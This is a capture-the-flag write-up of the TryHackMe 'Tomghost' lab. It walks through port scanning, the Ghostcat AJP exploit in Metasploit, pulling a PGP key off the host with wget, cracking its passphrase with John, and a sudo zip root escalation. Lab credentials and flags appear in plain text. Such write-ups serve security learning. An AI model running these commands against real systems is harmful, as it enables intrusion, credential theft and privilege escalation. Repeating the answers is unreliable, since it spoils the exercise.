# Enumeration

## Nmap

```jsx
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw

53/tcp   open  tcpwrapped syn-ack ttl 61

8009/tcp open  ajp13      syn-ack ttl 61 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http       syn-ack ttl 61 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
```

- Check cve of 8009

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/tomghost]
└─$ searchsploit ajp
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                                                                                                         | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                         | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                                           | multiple/webapps/49039.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- we found ajp metasploit

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(1).png)

- use msfconsole and search ajp
- use 0
- set up rhosts and exploit

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(2).png)

```jsx
skyfuck:8730281lkjlkjdqlksalks
```

## SSH (22)

- use the above credential and login via ssh

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(3).png)

```jsx
find / -type f -name user.txt 2> /dev/null
```

- use this cmd to find user.txt file

```jsx
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ find / -type f -name user.txt 2> /dev/null
/home/merlin/user.txt
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

# Post Exploitation

```jsx
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

- open webshell on skyfuck
- download from our kali

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/tomghost]
└─$ wget http://10.10.88.153:8000/tryhackme.asc
-----------------------------------------------
┌──(kali㉿kali)-[~/CTF/tryhackme/tomghost]
└─$ wget http://10.10.88.153:8000/credential.pgp
```

First, let’s convert the key into a hash with this command:

```jsx
gpg2john tryhackme.asc > hash.txt
```

Then, start cracking it with John.

```jsx
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(4).png)

```jsx
alexandru 
```

Now that I have the decrypted password, I can decrypt credential.pgp by using:

```jsx
gpg --import tryhackme.asc
gpg -d credential.pgp
```

- `-import` to import the key.
- `d` to decrypt the .pgp file.

```jsx
┌──(kali㉿kali)-[~/CTF/tryhackme/tomghost]
└─$ gpg --import tryhackme.asc
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/tryhackme/tomghost]
└─$ gpg -d credential.pgp
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
```

- we login ssh with merlin

It seems we need to use `sudo /zip` to access higher privileges.

```jsx
find / -perm -u=s -type f 2>/dev/null
```

Look for files with the SUID bit, which allows us to run files with elevated privileges beyond the current user.

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(5).png)

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(6).png)

- we can find that in GTFOBins
- we will use that commands

```jsx
TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/09d6585dc5beaffa64a86c075de65e482ff66145/Tomghost%20(THM)/Images/image%20(7).png)

Finally, we got the root.

```jsx
# cd /root
# ls
root.txt  ufw
# cat root.txt  
THM{Z1P_1S_FAKE}
```
